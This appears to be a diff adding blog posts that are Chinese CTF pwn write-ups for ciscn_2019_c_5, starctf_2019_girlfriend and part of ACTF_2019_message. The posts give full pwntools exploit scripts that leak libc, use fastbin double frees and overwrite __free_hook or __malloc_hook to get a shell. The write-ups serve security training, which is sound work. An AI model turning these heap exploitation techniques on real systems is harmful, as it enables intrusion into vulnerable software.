@@ -206,6 +206,372 @@
             
 
   
+    <article id="post-ciscn-2019-c-5" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/03/08/ciscn-2019-c-5/" target="_blank">ciscn_2019_c_5</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/03/08/ciscn-2019-c-5/" class="archive-article-date">
+        <time datetime="2024-03-08T04:49:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-08</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p> 保护全开</p>
+<p>有格式化字符串漏洞但是用%n$p之类的会报错，用%p不会，算得偏移是8</p>
+<p><img src="https://i0.imgs.ovh/2024/03/07/QOW8j.png" alt="image-20240308125027309"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/07/QO0AI.png" alt="image-20240308125159916"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,<span class="string">&#x27;%p%p%p%p%p%p%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;59&#x27;</span>)</span><br><span class="line">io_stder=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
+
+<h5 id="接收的话不是p-recvuntil-‘-x59’-，而是p-recvuntil-‘59’-，这里我犯了个错误"><a href="#接收的话不是p-recvuntil-‘-x59’-，而是p-recvuntil-‘59’-，这里我犯了个错误" class="headerlink" title="接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误"></a>接收的话不是p.recvuntil(‘\x59’)，而是p.recvuntil(‘59’)，这里我犯了个错误</h5><p><img src="https://i0.imgs.ovh/2024/03/07/Qe2aT.png" alt="image-20240308151037911"></p>
+<p>这里对应第七个参数</p>
+<p><img src="https://i0.imgs.ovh/2024/03/07/QeoBo.png" alt="image-20240308151240318"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./ciscn_2019_c_5&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,28941)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_5&#x27;</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,story</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;story:&#x27;</span>,story)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,<span class="string">&#x27;%p%p%p%p%p%p%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;59&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">io_stder=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)<span class="comment">#.ljust(8,b&#x27;\x00&#x27;)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input your ID.&#x27;</span>,<span class="string">&#x27;kkkk&#x27;</span>)</span><br><span class="line"></span><br><span class="line">base=io_stder-libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;io_st  &#x27;</span>+<span class="built_in">hex</span>(io_stder)+<span class="string">&#x27;system  &#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">free_hook=base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;bbbb&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;bin/sh\n&#x27;</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(free_hook)) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;aaaa&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;dddd&#x27;</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(system))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/03/08/ciscn-2019-c-5/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-starctf-2019-girlfriend" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/03/06/starctf-2019-girlfriend/" target="_blank">starctf_2019_girlfriend</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/03/06/starctf-2019-girlfriend/" class="archive-article-date">
+        <time datetime="2024-03-06T13:48:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-06</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>保护全开,本想以简单的uaf去解决，但是却会内存错误，所以这个方法不行</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node4.buuoj.cn&quot;,)</span></span><br><span class="line">p=process(<span class="string">&quot;./starctf_2019_girlfriend&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;girl&#x27;s name&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;please inpute her name:&#x27;</span>,content1)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;please input her call:&#x27;</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">88</span></span><br><span class="line">base=main_arena-<span class="number">0x10</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">system=base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook=base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;dddd&#x27;</span>,<span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;/bin/sh&#x27;</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_arena&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">free(<span class="number">2</span>) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">3</span>) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,p64(free_hook-<span class="number">0x10</span>),<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;eeee&#x27;</span>,<span class="string">&#x27;vvvv&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,p64(system),<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/06/QwhQd.png" alt="image-20240307120041249"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/06/Qwk1T.png" alt="image-20240306215632879"></p>
+<p><img src="https://i0.imgs.ovh/2024/03/06/Qw0vu.png" alt="image-20240306215708434"></p>
+<h5 id="首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main-arena-88"><a href="#首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main-arena-88" class="headerlink" title="首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88"></a>首先malloc一个0x80大小的堆，再申请0x60大小的，后面改成比0x60小的堆时都会出现内存报错，free堆0的时候不会和topchunk合并，得到main_arena+88</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="string">&#x27;ssss&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;dddd&#x27;</span>,<span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_arena&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook=main_arena-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">3</span>]</span><br><span class="line">realloc=libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+base</span><br><span class="line"><span class="comment">#这里的话得用到</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="realloc-hook-malloc-hook-0x8"><a href="#realloc-hook-malloc-hook-0x8" class="headerlink" title="realloc_hook&#x3D;malloc_hook-0x8"></a>realloc_hook&#x3D;malloc_hook-0x8</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>),p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;dddd&#x27;</span>,<span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_gadget=&#x27;</span>+<span class="built_in">hex</span>(one_gadget)+<span class="string">&#x27;   malloc=&#x27;</span>+<span class="built_in">hex</span>(malloc_hook-<span class="number">0x23</span>)+<span class="string">&#x27;   realloc=&#x27;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc+<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload,<span class="string">&#x27;cccc&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/06/Qso0K.png" alt="image-20240307191637279"></p>
+<h5 id="使用one-gadget的条件"><a href="#使用one-gadget的条件" class="headerlink" title="使用one_gadget的条件"></a>使用one_gadget的条件</h5><p><img src="https://i0.imgs.ovh/2024/03/06/Qsuaj.png" alt="image-20240307191828389"></p>
+<h5 id="关于realloc函数调整函数栈帧的知识，关于为什么用realloc-2的地址"><a href="#关于realloc函数调整函数栈帧的知识，关于为什么用realloc-2的地址" class="headerlink" title="关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址"></a>关于realloc函数调整函数栈帧的知识，关于为什么用realloc+2的地址</h5><p>[链接文本](<a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/f7fd9662.html">使用realloc函数来调整栈帧让one_gadget生效 | ZIKH26’s Blog</a>)</p>
+<h5 id="调试发现除了malloc-hook-0x23的地址可以改其它的地址都会报错，多1少1都不行"><a href="#调试发现除了malloc-hook-0x23的地址可以改其它的地址都会报错，多1少1都不行" class="headerlink" title="调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行"></a>调试发现除了malloc_hook-0x23的地址可以改其它的地址都会报错，多1少1都不行</h5><p><img src="https://i0.imgs.ovh/2024/03/06/QsU1O.png" alt="image-20240307193119248"></p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&quot;node5.buuoj.cn&quot;,25861)</span></span><br><span class="line">p=process(<span class="string">&quot;./starctf_2019_girlfriend&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">	gdb.attach(p)</span><br><span class="line">	sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content1,content2</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;girl&#x27;s name&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;please inpute her name:&#x27;</span>,content1)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;please input her call:&#x27;</span>,content2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Please input the index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(0x20,&#x27;aaaa&#x27;,&#x27;bbbb&#x27;)</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;aaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="string">&#x27;ssss&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;dddd&#x27;</span>,<span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_arena&#x27;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">malloc_hook=main_arena-<span class="number">88</span>-<span class="number">0x10</span></span><br><span class="line">base=malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">one = [<span class="number">0x45226</span>, <span class="number">0x4527a</span>, <span class="number">0xf03a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=base+one[<span class="number">3</span>]</span><br><span class="line">realloc=libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+base</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,p64(malloc_hook-<span class="number">0x23</span>),p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;cccc&#x27;</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">&#x27;dddd&#x27;</span>,<span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;one_gadget=&#x27;</span>+<span class="built_in">hex</span>(one_gadget)+<span class="string">&#x27;   malloc-0x23=&#x27;</span>+<span class="built_in">hex</span>(malloc_hook-<span class="number">0x23</span>)+<span class="string">&#x27;   realloc=&#x27;</span>+<span class="built_in">hex</span>(realloc))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x13</span>-<span class="number">8</span>)+p64(one_gadget)+p64(realloc+<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">debug()</span><br><span class="line">p.sendafter(<span class="string">&#x27;Input your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2024/03/06/starctf-2019-girlfriend/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-ACTF-2019-message" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2024/03/05/ACTF-2019-message/" target="_blank">ACTF_2019_message</a>
+  
+    </h1>
+  
+
+
+  
+  
+<a href="/2024/03/05/ACTF-2019-message/" class="archive-article-date">
+        <time datetime="2024-03-05T11:24:11.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-03-05</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <p>有uaf漏洞，但是打印的话会检查size，所以不能简单地uaf</p>
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYMIU.png" alt="image-20240305192928168"></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x200</span>,p64(<span class="number">0x60204c</span>))</span><br><span class="line">add(<span class="number">0x200</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYkHR.png" alt="image-20240305194658879"></p>
+<p>成功控制堆指针</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(1)+p64(0)+b&#x27;\x00&#x27;*4+p64(0x200)+p64(0x60204c)+p64(0)*20</span><br><span class="line"></span><br><span class="line">add(0x200,payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.imgs.ovh/2024/03/04/OYScj.png" alt="image-20240305201228735"></p>
